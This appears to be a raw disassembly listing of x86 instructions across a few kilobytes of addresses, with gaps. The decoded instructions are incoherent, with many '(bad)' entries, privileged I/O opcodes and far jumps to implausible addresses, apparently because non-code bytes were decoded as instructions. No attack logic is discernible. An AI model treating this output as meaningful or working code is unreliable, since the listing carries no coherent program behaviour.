  42e968:	inc    ebx
  42e969:	iret   
  42e96a:	xor    eax,ecx
  42e96c:	sub    al,0xd4
  42e96e:	xchg   ebx,eax
  42e96f:	mov    esp,0xc70f2ac2
  42e974:	ds push edi
  42e976:	xchg   ecx,eax
  42e977:	les    esp,FWORD PTR [esi]
  42e979:	je     0x42e9cf
  42e97b:	jecxz  0x42e922
  42e97d:	out    0xad,al
  42e97f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e980:	lods   al,BYTE PTR ds:[esi]
  42e981:	jb     0x42e91b
  42e983:	sbb    ah,BYTE PTR [edx]
  42e985:	jg     0x42e917
  42e987:	cmp    DWORD PTR [esi+0x5],esp
  42e98a:	push   ebp
  42e98b:	std    
  42e98c:	lods   eax,DWORD PTR ds:[esi]
  42e98d:	xor    DWORD PTR [esi-0x35],ecx
  42e990:	stc    
  42e991:	jle    0x42e9ec
  42e993:	xchg   edi,eax
  42e994:	xor    bx,cx
  42e997:	adc    BYTE PTR [esi-0x4e],dl
  42e99a:	lock xchg ebx,eax
  42e99c:	int    0x18
  42e99e:	mov    cs,edx
  42e9a0:	add    DWORD PTR [ebx+0x16],0xffffffc6
  42e9a4:	jmp    0xb9157b28
  42e9a9:	sub    ecx,ebx
  42e9ab:	xor    al,0x5d
  42e9ad:	jo     0x42e934
  42e9af:	shl    DWORD PTR [ecx],cl
  42e9b1:	inc    esp
  42e9b2:	adc    DWORD PTR [edi],ebp
  42e9b4:	ins    BYTE PTR es:[edi],dx
	...
  42ea15:	add    ch,ah
  42ea17:	mov    edx,0xebdfe392
  42ea1c:	cmc    
  42ea1d:	mov    esi,0xe8a967c2
  42ea22:	dec    ebp
  42ea23:	xchg   edi,eax
  42ea24:	inc    DWORD PTR [esi-0x48]
  42ea27:	repz add DWORD PTR [eax],eax
  42ea2a:	pop    es
  42ea2b:	add    DWORD PTR [eax],eax
  42ea2d:	add    BYTE PTR [esi],bh
  42ea2f:	xor    eax,0x4d75a965
  42ea34:	sahf   
  42ea35:	stos   DWORD PTR es:[edi],eax
  42ea36:	dec    esp
  42ea37:	jno    0x42ea3f
  42ea39:	or     al,0x32
  42ea3b:	pop    ecx
  42ea3c:	repz mov esp,0x2290a1c2
  42ea42:	dec    ecx
  42ea43:	fcmovnu st,st(1)
  42ea45:	je     0x42ea88
  42ea47:	push   ecx
  42ea48:	lods   al,BYTE PTR ds:[esi]
  42ea49:	push   ss
  42ea4a:	push   ds
  42ea4b:	les    ebp,FWORD PTR [eax+0x6c5125ba]
  42ea51:	dec    edx
  42ea52:	dec    ebx
  42ea53:	add    al,0xb1
  42ea55:	sbb    DWORD PTR [esi-0x33],eax
  42ea58:	and    al,0x6b
  42ea5a:	xor    cl,BYTE PTR [eax+0x736cce8a]
  42ea60:	jne    0x42ea1a
  42ea62:	popa   
  42ea63:	rsm    
  42ea65:	fmul   QWORD PTR [ecx+eax*4]
  42ea68:	or     al,0x2b
  42ea6a:	inc    ecx
  42ea6b:	lods   eax,DWORD PTR ds:[esi]
  42ea6c:	repz xor dh,ah
  42ea6f:	xlat   BYTE PTR ds:[ebx]
  42ea70:	mov    dh,0x56
  42ea72:	sbb    DWORD PTR [eax+0x77],esi
  42ea75:	arpl   WORD PTR [edi],cx
  42ea77:	bound  ecx,QWORD PTR [esi-0x5e22445b]
  42ea7d:	stos   BYTE PTR es:[edi],al
  42ea7e:	inc    ebx
  42ea7f:	lods   eax,DWORD PTR ds:[esi]
  42ea80:	mov    ecx,0xbf77618
  42ea85:	dec    edi
  42ea86:	inc    eax
  42ea87:	add    dl,cl
  42ea89:	pop    ds
  42ea8a:	mov    BYTE PTR [edx],bh
  42ea8c:	and    eax,0x96eb164d
  42ea91:	adc    BYTE PTR [edx+0x3c6213e3],dl
  42ea97:	add    DWORD PTR gs:[edx],0xffffffaa
  42ea9b:	jbe    0x42ea5a
  42ea9d:	inc    edx
  42ea9e:	push   0x3083c67c
  42eaa3:	int    0x75
  42eaa5:	push   esi
  42eaa6:	inc    ebp
  42eaa7:	inc    ebx
  42eaa8:	pop    edx
  42eaa9:	push   cs
  42eaaa:	mov    ch,0x69
  42eaac:	sbb    esi,DWORD PTR [esi]
  42eaae:	pop    esi
  42eaaf:	out    0x25,eax
  42eab1:	out    0x72,eax
  42eab3:	aas    
  42eab4:	adc    al,0x83
  42eab6:	xor    ch,BYTE PTR [ecx]
  42eab8:	pop    eax
  42eab9:	out    0x8d,al
  42eabb:	pop    ebp
  42eabc:	shl    edi,cl
  42eabe:	(bad)  
  42eabf:	pop    ebp
  42eac0:	sub    BYTE PTR ds:0xc2d57ecb,dh
  42eac6:	jb     0x42eb05
  42eac8:	test   edi,ebx
  42eaca:	mov    dl,0xb7
  42eacc:	jbe    0x42eafd
  42eace:	mov    esi,0x51b6f037
  42ead3:	add    al,0xb7
  42ead5:	pop    esp
  42ead6:	(bad)  
  42ead7:	je     0x42eb4d
  42ead9:	adc    eax,0x746f4255
  42eade:	lods   al,BYTE PTR ds:[esi]
  42eadf:	mov    dh,0x5e
  42eae1:	xor    dh,al
  42eae3:	dec    ebp
  42eae4:	js     0x42ea68
  42eae6:	dec    esp
  42eae7:	das    
  42eae8:	scas   al,BYTE PTR es:[edi]
  42eae9:	(bad)  [esi+ebx*1-0x13]
  42eaed:	ds pop esi
  42eaef:	xor    eax,DWORD PTR [ebx-0x35bdd993]
  42eaf5:	xchg   ebp,eax
  42eaf6:	mov    edx,ecx
  42eaf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eaf9:	sub    al,0x92
  42eafb:	inc    ebp
  42eafc:	mov    eax,ds:0x19d70b73
  42eb01:	shl    DWORD PTR [edi],cl
  42eb03:	dec    eax
  42eb04:	(bad)  
  42eb05:	cli    
  42eb06:	and    DWORD PTR [edi],esi
  42eb08:	fadd   st,st(0)
  42eb0a:	add    DWORD PTR [ecx-0x5],esi
  42eb0d:	push   ds
  42eb0e:	outs   dx,DWORD PTR ds:[esi]
  42eb0f:	imul   ecx,DWORD PTR [edx+0x6f],0x4
  42eb13:	(bad)  
  42eb14:	leave  
  42eb15:	mov    al,ds:0xb3058601
  42eb1a:	int    0xbd
  42eb1c:	add    eax,0x90fc6755
  42eb21:	test   eax,0xe2491946
  42eb26:	inc    ebp
  42eb27:	mov    bl,0x55
  42eb29:	inc    edx
  42eb2a:	mov    ah,0xbb
  42eb2c:	test   DWORD PTR [edi+0x742d5574],0xc6b043
	...
  42eb96:	jle    0x42ebd9
  42eb98:	jne    0xfc41badd
  42eb9e:	add    DWORD PTR [edi+0x7ea55ada],ebp
  42eba4:	sbb    al,0x2f
  42eba6:	mov    edi,0x70001f4
  42ebab:	add    DWORD PTR [eax],eax
  42ebad:	add    BYTE PTR [esi+esi*8-0x339a613],ah
  42ebb4:	lock pop ebx
  42ebb6:	mov    ecx,0x4cb4d8ae
  42ebbb:	jo     0x42ebed
  42ebbd:	aam    0xe7
  42ebbf:	mov    al,0x90
  42ebc1:	fild   DWORD PTR [ebx-0x4]
  42ebc4:	pop    esi
  42ebc5:	int    0xa8
  42ebc7:	shl    dl,cl
  42ebc9:	and    BYTE PTR [edx+0x1b],bl
  42ebcc:	mov    al,ds:0x23dfa87c
  42ebd1:	mov    ?,WORD PTR [edx-0x1d]
  42ebd4:	nop
  42ebd5:	aaa    
  42ebd6:	stc    
  42ebd7:	call   0x481e:0x53dd904d
  42ebde:	je     0x42eb7b
  42ebe0:	lahf   
  42ebe1:	aad    0xc8
  42ebe3:	repz fdivr DWORD PTR [ecx]
  42ebe6:	inc    edx
  42ebe7:	loopne 0x42ebaa
  42ebe9:	shl    BYTE PTR [edi-0x59e88a5c],0x72
  42ebf0:	cdq    
  42ebf1:	ret    
  42ebf2:	pop    ss
  42ebf3:	dec    ecx
  42ebf4:	mov    WORD PTR [edi-0x5f],cs
  42ebf7:	adc    eax,0x1a9f1e87
  42ebfc:	push   0x1b
  42ebfe:	xor    cl,ah
  42ec00:	push   ss
  42ec01:	pop    ecx
  42ec02:	sbb    ch,BYTE PTR [esi]
  42ec04:	(bad)
  42ec07:	(bad)  
  42ec09:	daa    
  42ec0a:	stos   DWORD PTR es:[edi],eax
  42ec0b:	inc    ebp
  42ec0c:	dec    edi
  42ec0d:	stos   BYTE PTR es:[edi],al
  42ec0e:	pop    ebx
  42ec0f:	push   ebp
  42ec10:	popf   
  42ec11:	or     ebp,DWORD PTR [eax+eiz*1]
  42ec14:	sub    cl,BYTE PTR [edx+edx*4]
  42ec17:	clc    
  42ec18:	lahf   
  42ec19:	fs sub esi,0xffffff91
  42ec1d:	mov    dh,0xac
  42ec1f:	stc    
  42ec20:	ss cmp al,0x4c
  42ec23:	pop    ecx
  42ec24:	inc    eax
  42ec25:	xchg   edi,eax
  42ec26:	cmp    eax,0xa1e32787
  42ec2b:	fld    TBYTE PTR [esi+0x6848fed0]
  42ec31:	rol    BYTE PTR [eax],1
  42ec33:	mov    ?,WORD PTR [ecx-0x693777d]
  42ec39:	nop
  42ec3a:	das    
  42ec3b:	les    esp,FWORD PTR [ebx-0xc7dadb]
  42ec41:	mov    eax,ds:0xa071a234
  42ec46:	jns    0x42ec13
  42ec48:	pop    ds
  42ec49:	ds xchg ebx,eax
  42ec4b:	fcom   QWORD PTR [esi+0x6d]
  42ec4e:	mov    DWORD PTR [edi-0x32a8b715],esi
  42ec54:	data16 cld 
  42ec56:	jnp    0x42ec04
  42ec58:	bound  eax,QWORD PTR [edx+ebp*2]
  42ec5b:	iret   
  42ec5c:	add    eax,0x28997a04
  42ec61:	sub    DWORD PTR [esi+0x56711e2d],ebx
  42ec67:	inc    esp
  42ec68:	adc    BYTE PTR [ebx-0x71],bh
  42ec6b:	das    
  42ec6c:	bound  ebx,QWORD PTR [edx]
  42ec6e:	or     DWORD PTR [esi+ebx*1-0x12b60bd5],ecx
  42ec75:	rol    edi,1
  42ec77:	dec    edx
  42ec78:	and    eax,0xd2c6328b
  42ec7d:	sub    esp,DWORD PTR [edx+ebx*2]
  42ec80:	loop   0x42ec53
  42ec82:	cmp    al,0x14
  42ec84:	scas   eax,DWORD PTR es:[edi]
  42ec85:	mov    ds:0x457a7931,eax
  42ec8a:	inc    ecx
  42ec8b:	retf   0x36fa
  42ec8e:	cmp    al,0xac
  42ec90:	pop    edi
  42ec91:	mov    eax,0x2aaed636
  42ec96:	data16 sar BYTE PTR [edi],0x27
  42ec9a:	push   eax
  42ec9b:	or     al,0x2
  42ec9d:	push   ds
  42ec9e:	pusha  
  42ec9f:	sar    DWORD PTR [ebx],cl
  42eca1:	xchg   ebp,eax
  42eca2:	int3   
  42eca3:	out    dx,al
  42eca4:	test   BYTE PTR [esi],dl
  42eca6:	jmp    0xd99d512c
  42ecab:	in     al,dx
  42ecac:	pop    DWORD PTR [esp+eiz*2]
  42ecaf:	int    0xdc
  42ecb1:	out    dx,al
  42ecb2:	mov    esi,0x4415
	...
  42ed13:	add    BYTE PTR [eax],al
  42ed15:	add    BYTE PTR [edx],ch
  42ed17:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed1d:	idiv   BYTE PTR [esi+0x4df0a17f]
  42ed23:	xchg   edx,eax
  42ed24:	dec    edx
  42ed25:	repnz (bad) 
  42ed27:	cmc    
  42ed28:	add    DWORD PTR [eax],eax
  42ed2a:	pop    es
  42ed2b:	add    DWORD PTR [eax],eax
  42ed2d:	add    BYTE PTR [eax],cl
  42ed2f:	(bad)  
  42ed30:	daa    
  42ed31:	mov    ss,WORD PTR [ebp+edx*4+0x49]
  42ed35:	adc    DWORD PTR ds:0xa3311d90,eax
  42ed3b:	nop
  42ed3c:	aas    
  42ed3d:	push   es
  42ed3e:	mov    edi,0x6286977e
  42ed43:	fs sub ebp,0x692ab6a1
  42ed4a:	ficom  WORD PTR [ebp+0x75]
  42ed4d:	sub    BYTE PTR [edx+eax*8+0x49],dl
  42ed51:	pop    edx
  42ed52:	vshufpd ymm4,ymm0,YMMWORD PTR [edi],0xaa
  42ed57:	mov    esp,0xad1e49e6
  42ed5c:	rol    DWORD PTR [ecx+0x1c],0xf2
  42ed60:	cmp    eax,0xf48a3fbe
  42ed65:	aas    
  42ed66:	adc    dl,ah
  42ed68:	mov    dl,0x91
  42ed6a:	ffreep st(3)
  42ed6c:	pop    ecx
  42ed6d:	xor    esi,ebx
  42ed6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ed70:	in     al,dx
  42ed71:	add    eax,0x370e9ea8
  42ed76:	hlt    
  42ed77:	add    eax,0x5eeb5f38
  42ed7c:	adc    DWORD PTR ds:0xc8b52864,ebx
  42ed82:	and    DWORD PTR [ebx+0x3d12ecc1],edi
  42ed88:	adc    ch,BYTE PTR [eax+0x51d2bda0]
  42ed8e:	std    
  42ed8f:	imul   esp,DWORD PTR [edi],0xfcf60c41
  42ed95:	cmp    DWORD PTR [ebx-0x21],ebp
  42ed98:	mov    edi,0xd1a45719
  42ed9d:	lds    edi,FWORD PTR [edi+0x4479f5f4]
  42eda3:	hlt    
  42eda4:	adc    DWORD PTR [ebx+0x41],esi
  42eda7:	cwde   
  42eda8:	cmp    ah,BYTE PTR [ebx-0x6cb902b0]
  42edae:	cwde   
  42edaf:	or     BYTE PTR [ebx+0x1c],dh
  42edb2:	retf   
  42edb3:	dec    ebx
  42edb4:	arpl   WORD PTR [edx-0x214b28ba],dx
  42edba:	adc    cl,bh
  42edbc:	cmp    al,0xf6
  42edbe:	dec    edx
  42edbf:	and    esi,ecx
  42edc1:	lock pop ebx
  42edc3:	mov    edx,0xcaf1b290
  42edc8:	jnp    0x42ed82
  42edca:	add    ecx,DWORD PTR [ebp-0x76]
  42edcd:	and    bl,BYTE PTR [edi+0x11]
  42edd0:	enter  0xf837,0x77
  42edd4:	inc    edx
  42edd5:	dec    ecx
  42edd6:	inc    ebp
  42edd7:	stc    
  42edd8:	jne    0x42eda6
  42edda:	int    0x90
  42eddc:	push   ecx
  42edde:	xor    eax,0xca6325d7
  42ede3:	jecxz  0x42edc5
  42ede5:	stos   DWORD PTR es:[edi],eax
  42ede6:	mov    eax,0xf4a76c46
  42edeb:	ja     0x42edcb
  42eded:	mov    ebp,DWORD PTR [ecx+0x30fac2d3]
  42edf3:	inc    eax
  42edf4:	aad    0x77
  42edf6:	mov    dl,0x79
  42edf8:	cmc    
  42edf9:	ret    0xa4c7
  42edfc:	inc    edx
  42edfd:	mov    DWORD PTR [eax],ecx
  42edff:	pop    ds
  42ee00:	jg     0x42ee1e
  42ee02:	repz push es
  42ee04:	dec    ebx
  42ee05:	adc    esp,DWORD PTR [esi]
  42ee07:	loop   0x42ee44
  42ee09:	aaa    
  42ee0a:	cmc    
  42ee0b:	xchg   BYTE PTR [ebx],cl
  42ee0d:	adc    al,ah
  42ee0f:	xchg   DWORD PTR [ebx-0x7a],edx
  42ee12:	int3   
  42ee13:	xchg   edi,eax
  42ee14:	scas   al,BYTE PTR es:[edi]
  42ee15:	push   edx
  42ee16:	dec    ebp
  42ee17:	xchg   DWORD PTR fs:[edx],eax
  42ee1a:	fbstp  TBYTE PTR [ebp-0x48]
  42ee1d:	or     ebx,DWORD PTR [ebx+0x70]
  42ee20:	fsubr  QWORD PTR ds:0xc066162a
  42ee26:	mov    edx,0x5fb1bf9f
  42ee2b:	jae    0x42edb8
  42ee2d:	push   ecx
  42ee2f:	imul   edi,ecx,0xe503c88a
	...
  42ee95:	add    bl,al
  42ee97:	add    cl,BYTE PTR [eax]
  42ee99:	xor    eax,0xf6ff3fc9
  42ee9e:	sub    DWORD PTR ds:0xc0e9f479,edi
  42eea4:	and    ebx,DWORD PTR [ebx]
  42eea6:	int    0xf6
  42eea8:	add    DWORD PTR [eax],eax
  42eeaa:	pop    es
  42eeab:	add    DWORD PTR [eax],eax
  42eead:	add    al,dl
  42eeaf:	rcl    ebp,cl
  42eeb1:	jae    0x42eefc
  42eeb3:	jmp    0x42eec4
  42eeb5:	fs push ebx
  42eeb7:	inc    edx
  42eeb8:	adc    DWORD PTR [esi-0x5a],0xffffffa3
  42eebc:	adc    BYTE PTR [edx],dl
  42eebe:	dec    edx
  42eebf:	scas   al,BYTE PTR es:[edi]
  42eec0:	test   eax,0xf4048946
  42eec5:	or     al,0xb5
  42eec7:	sbb    eax,0x1512fd6b
  42eecc:	xchg   edx,eax
  42eecd:	sbb    eax,0x42958bce
  42eed2:	inc    esi
  42eed3:	lock add eax,0x5853fa2c
  42eed9:	enter  0x3cc3,0x87
  42eedd:	arpl   WORD PTR [esi-0x21],bx
  42eee0:	sbb    ch,bh
  42eee2:	test   al,0x36
  42eee4:	loopne 0x42ef32
  42eee6:	push   0x6b59957e
  42eeeb:	mov    ebx,0x8bc3b854
  42eef0:	or     DWORD PTR [eax],edi
  42eef2:	jne    0x42ef15
  42eef4:	mov    bh,0x82
  42eef6:	cmp    ebp,DWORD PTR [ecx+esi*8+0x5d]
  42eefa:	fisttp QWORD PTR [ebx-0x50]
  42eefd:	aad    0xe2
  42eeff:	repz push 0x290db852
  42ef05:	jmp    0x42ee92
  42ef07:	push   ebp
  42ef08:	jns    0x42ef63
  42ef0a:	ds ins DWORD PTR es:[edi],dx
  42ef0c:	aad    0x89
  42ef0e:	mov    al,ds:0x6ed99f28
  42ef13:	imul   ebx,DWORD PTR [ebx-0x33],0x5
  42ef17:	or     ebx,DWORD PTR [eax+ebp*4]
  42ef1a:	dec    ebp
  42ef1b:	pop    esi
  42ef1c:	mov    al,BYTE PTR [esi]
  42ef1e:	add    BYTE PTR [esp+edi*2-0x60],ah
  42ef22:	mov    esp,0x2da32c4a
  42ef27:	cmp    dh,BYTE PTR [ecx+0x2b]
  42ef2a:	add    eax,0x619029ce
  42ef2f:	mov    bh,0x48
  42ef31:	sbb    BYTE PTR [edx-0x558447ab],cl
  42ef37:	jnp    0x42eec1
  42ef39:	mov    sp,0x32f5
  42ef3d:	dec    ecx
  42ef3e:	loop   0x42eefd
  42ef40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef41:	icebp  
  42ef42:	adc    eax,eax
  42ef44:	mov    ebx,0xe64cab09
  42ef49:	js     0x42eed5
  42ef4b:	pusha  
  42ef4c:	add    al,0x4f
  42ef4e:	mov    edi,0xb2baeb1d
  42ef53:	mov    ch,0x52
  42ef55:	xor    BYTE PTR [edx],ch
  42ef57:	test   BYTE PTR [ebx-0x2e4be4c5],dl
  42ef5d:	mov    edi,0x46f2098c
  42ef62:	cld    
  42ef63:	enter  0xdb4f,0x9d
  42ef67:	in     eax,dx
  42ef68:	les    edx,FWORD PTR [edi-0x3a]
  42ef6b:	xor    bh,BYTE PTR [esi]
  42ef6d:	stos   BYTE PTR es:[edi],al
  42ef6e:	in     al,dx
  42ef6f:	mov    ebx,0x3a70a37f
  42ef74:	out    dx,eax
  42ef75:	dec    edi
  42ef76:	mov    dl,0xeb
  42ef78:	xchg   edx,eax
  42ef79:	and    DWORD PTR [esi+0x4b],0x59e316f8
  42ef80:	sbb    al,0x5
  42ef82:	mov    edi,0x89e0802f
  42ef87:	neg    DWORD PTR [esi]
  42ef89:	gs ss ins BYTE PTR es:[edi],dx
  42ef8c:	rcl    ebp,1
  42ef8e:	mov    ds:0x6b980c8b,eax
  42ef93:	inc    ebp
  42ef94:	dec    edi
  42ef95:	xchg   ebx,eax
  42ef96:	or     DWORD PTR [ebp+ecx*4-0x17],ebx
  42ef9a:	cmp    BYTE PTR [edx],dh
  42ef9c:	mov    ebx,0x7b69e6c5
  42efa1:	(bad)  
  42efa2:	dec    ebp
  42efa3:	or     BYTE PTR [eax-0x1d80a53d],bl
  42efa9:	fidiv  WORD PTR [ebx]
  42efab:	cs (bad) 
  42efad:	leave  
  42efae:	push   ecx
  42efaf:	es hlt 
  42efb1:	xor    BYTE PTR [ebp+0x80a],0x0
	...
  42f014:	add    BYTE PTR [eax],al
  42f016:	adc    bh,BYTE PTR [esi]
  42f018:	int    0xe5
  42f01a:	in     eax,dx
  42f01b:	idiv   DWORD PTR [edx]
  42f01d:	call   edx
  42f01f:	sbb    eax,0x8e92d516
  42f024:	mov    ecx,0x1f7d44b
  42f029:	add    BYTE PTR [edi],al
  42f02b:	add    DWORD PTR [eax],eax
  42f02d:	add    BYTE PTR [edx-0x22c73ab1],dh
  42f033:	jns    0x42effa
  42f035:	in     al,dx
  42f036:	lock add ah,ah
  42f039:	mov    cl,0xf5
  42f03b:	xor    dh,ch
  42f03d:	frstor [esi+0x462d9363]
  42f043:	xor    al,0x8b
  42f045:	mov    ebx,0xf6266f66
  42f04a:	ja     0x42f09b
  42f04c:	mov    ds:0x368cbe46,eax
  42f051:	jbe    0x42eff0
  42f053:	cmp    al,0xc2
  42f055:	sar    DWORD PTR [ebx+0x1407b90e],1
  42f05b:	retf   0x986a
  42f05e:	xchg   BYTE PTR [ecx+0x1f],ah
  42f061:	inc    DWORD PTR [edi]
  42f063:	imul   edi,DWORD PTR [edi],0xffffffae
  42f066:	dec    esp
  42f067:	scas   al,BYTE PTR es:[edi]
  42f068:	adc    esi,0x35be20e
  42f06e:	mov    al,0xdb
  42f070:	outs   dx,DWORD PTR ds:[esi]
  42f071:	push   edx
  42f072:	xor    eax,0x6a6a8d39
  42f077:	fs adc eax,0xc53f0a0a
  42f07d:	adc    al,0x81
  42f07f:	mov    ah,0x6
  42f081:	cli    
  42f082:	mov    al,ds:0xe21a7f0
  42f087:	outs   dx,DWORD PTR ds:[esi]
  42f088:	out    0xcb,eax
  42f08a:	xor    edi,DWORD PTR [eax]
  42f08c:	inc    esi
  42f08d:	inc    ebp
  42f08e:	and    al,0x32
  42f090:	mov    ebp,0x80f0bc37
  42f095:	mov    eax,ds:0xffd2f8a5
  42f09a:	cmp    bh,BYTE PTR [esi+0x73b996e2]
  42f0a0:	mov    es,WORD PTR [esi+0x10]
  42f0a3:	gs (bad) 
  42f0a5:	and    eax,0x65c1990c
  42f0aa:	sbb    BYTE PTR [ecx],dh
  42f0ac:	mov    bh,0x93
  42f0ae:	add    eax,0x762444c5
  42f0b3:	fs jmp 0xf64f:0xda69b108
  42f0bb:	ret    
  42f0bc:	inc    ebp
  42f0bd:	scas   eax,DWORD PTR es:[edi]
  42f0be:	xor    BYTE PTR [ebx],dl
  42f0c0:	fdivr  QWORD PTR [edi]
  42f0c2:	jl     0x42f0a8
  42f0c4:	retf   0x61b6
  42f0c7:	and    DWORD PTR [edi+0x5cb47d27],edx
  42f0cd:	inc    esp
  42f0ce:	xchg   ecx,eax
  42f0cf:	jge    0x42f05d
  42f0d1:	sti    
  42f0d2:	test   BYTE PTR [edx+ecx*8+0x40],cl
  42f0d6:	out    0xcc,al
  42f0d8:	repz jns 0x42f061
  42f0db:	out    0xfa,al
  42f0dd:	pop    eax
  42f0de:	in     eax,dx
  42f0df:	and    ebp,DWORD PTR ss:[edx-0x237d5cc9]
  42f0e6:	xor    BYTE PTR [edi-0x17],0xd1
  42f0ea:	mov    es,WORD PTR [edx]
  42f0ec:	in     al,dx
  42f0ed:	rcl    BYTE PTR [ebp+edx*4-0x54],1
  42f0f1:	xchg   bl,ah
  42f0f3:	jecxz  0x42f103
  42f0f5:	cwde   
  42f0f6:	icebp  
  42f0f7:	jae    0x42f153
  42f0f9:	lods   al,BYTE PTR ds:[esi]
  42f0fa:	div    ah
  42f0fc:	(bad)
  42f102:	or     al,0xe8
  42f104:	or     DWORD PTR [edx+0xa96fea6],ecx
  42f10a:	stos   BYTE PTR es:[edi],al
  42f10b:	les    esi,FWORD PTR [esi+0x2bee1804]
  42f111:	adc    bl,BYTE PTR [esi+0x28]
  42f114:	push   esp
  42f115:	mov    bh,0x63
  42f117:	(bad)  
  42f118:	push   eax
  42f119:	test   eax,0xa720824b
  42f11e:	xchg   esi,eax
  42f11f:	cmp    ah,BYTE PTR [eax-0x57]
  42f122:	xchg   ecx,eax
  42f123:	(bad)  
  42f124:	or     BYTE PTR [edi],cl
  42f126:	or     ebx,esi
  42f128:	popa   
  42f129:	or     al,0x63
  42f12b:	mov    al,0xbc
  42f12d:	push   0x2b4b7340
  42f132:	mov    WORD PTR [ebp-0x3e],fs
	...
  42f195:	add    BYTE PTR [edx+0x26],bl
  42f198:	jecxz  0x42f1dd
  42f19a:	inc    edi
  42f19c:	cli    
  42f19d:	aas    
  42f19e:	clc    
  42f19f:	fdivr  st(3),st
  42f1a1:	jne    0x42f1fe
  42f1a3:	push   eax
  42f1a4:	ret    0xdb41
  42f1a7:	clc    
  42f1a8:	add    DWORD PTR [eax],eax
  42f1aa:	pop    es
  42f1ab:	add    DWORD PTR [eax],eax
  42f1ad:	add    BYTE PTR [ebx+0x51],dl
  42f1b0:	pop    ecx
  42f1b1:	les    edi,FWORD PTR [eax-0x2b]
  42f1b4:	sahf   
  42f1b5:	xor    ah,BYTE PTR [ebx]
  42f1b7:	out    0x3d,eax
  42f1b9:	loopne 0x42f1e5
  42f1bb:	jno    0x42f230
  42f1bd:	fstp   QWORD PTR [ecx-0x1a]
  42f1c0:	jmp    0xc7c7:0xc78db005
  42f1c7:	rcr    DWORD PTR [edx-0x73a6ff73],cl
  42f1cd:	jecxz  0x42f1cb
  42f1cf:	ins    BYTE PTR es:[edi],dx
  42f1d0:	lods   al,BYTE PTR ds:[esi]
  42f1d1:	ret    0x7e33
  42f1d4:	pop    ebp
  42f1d5:	inc    ecx
  42f1d6:	or     esp,0xe2d6f840
  42f1dc:	add    eax,0xc43192a9
  42f1e1:	dec    ebp
  42f1e2:	push   ss
  42f1e3:	xchg   ebp,eax
  42f1e4:	(bad)  
  42f1e6:	push   esi
  42f1e7:	push   0xffffffc7
  42f1e9:	pop    es
  42f1ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f1eb:	jge    0x42f24e
  42f1ed:	ins    BYTE PTR es:[edi],dx
  42f1ee:	mov    ebp,0xde50fe56
  42f1f3:	jl     0x42f18b
  42f1f5:	adc    esi,DWORD PTR [ebx+0x46]
  42f1f8:	mov    WORD PTR [ecx+eiz*1],?
  42f1fb:	or     esp,DWORD PTR [ebp+0x29]
  42f1fe:	sub    eax,0x123ca61e
  42f203:	ret    
  42f204:	lea    sp,[eax]
  42f207:	adc    al,0x1b
  42f209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f20a:	mov    DWORD PTR [ebp+0x6],ebp
  42f20d:	mov    eax,ds:0x3b1ba48f
  42f212:	cmc    
  42f213:	jmp    0x42f1f1
  42f215:	and    esp,DWORD PTR [esi+0x81bca50]
  42f21b:	scas   al,BYTE PTR es:[edi]
  42f21c:	ret    0x94e
  42f21f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f220:	repz mov bh,BYTE PTR [esi+0x6aef278c]
  42f227:	and    al,0x68
  42f229:	dec    esp
  42f22b:	jbe    0x42f292
  42f22d:	lods   al,BYTE PTR ds:[esi]
  42f22e:	jb     0x42f20c
  42f230:	rcl    DWORD PTR [ecx],0x8f
  42f233:	call   0xd20c:0x7a43e11f
  42f23a:	adc    bh,ch
  42f23c:	into   
  42f23d:	xchg   ebp,eax
  42f23e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f23f:	jge    0x42f1d5
  42f241:	cmc    
  42f242:	das    
  42f243:	inc    eax
  42f244:	push   ds
  42f245:	in     eax,dx
  42f246:	mov    dh,0xa5
  42f248:	bound  ebp,QWORD PTR [ebx+eax*8+0x29]
  42f24c:	push   cs
  42f24d:	add    ebx,edx
  42f24f:	adc    bh,BYTE PTR [ebp+0x38]
  42f252:	scas   al,BYTE PTR es:[edi]
  42f253:	xchg   esp,eax
  42f254:	pop    ebx
  42f255:	xlat   BYTE PTR ds:[ebx]
  42f256:	rcr    BYTE PTR [ebp+0x61],cl
  42f259:	call   0x7351969c
  42f25e:	je     0x42f2a6
  42f260:	sbb    eax,0xe12aef28
  42f265:	dec    ebx
  42f266:	add    eax,0xbd37c782
  42f26b:	imul   BYTE PTR [edi]
  42f26d:	in     al,0x26
  42f26f:	rol    BYTE PTR [eax+0x6aab956a],cl
  42f275:	or     edi,DWORD PTR [ebp+0x55679d83]
  42f27b:	inc    ecx
  42f27c:	icebp  
  42f27d:	or     ebp,DWORD PTR [ebp+0x6b18d1ed]
  42f283:	dec    ecx
  42f284:	push   ds
  42f285:	adc    dl,BYTE PTR [edx+0x1f]
  42f288:	and    BYTE PTR [edi],cl
  42f28a:	cdq    
  42f28b:	scas   eax,DWORD PTR es:[edi]
  42f28c:	pop    edx
  42f28d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f28e:	cmp    DWORD PTR [eax-0x7ebcc983],edx
  42f294:	adc    DWORD PTR [ecx+eax*2],0xd31580f0
  42f29b:	jmp    0x3b7e:0x2be94127
  42f2a2:	sub    BYTE PTR [eax],bl
  42f2a4:	and    cl,BYTE PTR [edi-0x41]
  42f2a7:	or     eax,0x8096b79
  42f2ac:	loop   0x42f256
  42f2ae:	add    DWORD PTR [edx-0x253cc210],esi
	...
  42f314:	add    BYTE PTR [eax],al
  42f316:	mov    ebp,0xaf8a081a
  42f31b:	call   0x6da4:0xb5dd3fbf
  42f322:	test   DWORD PTR [ebx-0x61d5bf6],ebp
  42f328:	add    DWORD PTR [eax],eax
  42f32a:	pop    es
  42f32b:	add    DWORD PTR [eax],eax
  42f32d:	add    BYTE PTR [eax+0x39],dh
  42f330:	xlat   BYTE PTR ds:[ebx]
  42f331:	xor    dh,al
  42f333:	push   es
  42f334:	test   edi,esp
  42f336:	pop    es
  42f337:	mov    eax,0x929036be
  42f33c:	outs   dx,DWORD PTR ds:[esi]
  42f33d:	inc    ebp
  42f33e:	sbb    ecx,esi
  42f340:	add    esi,ebp
  42f342:	mov    dh,0x84
  42f344:	aas    
  42f345:	aaa    
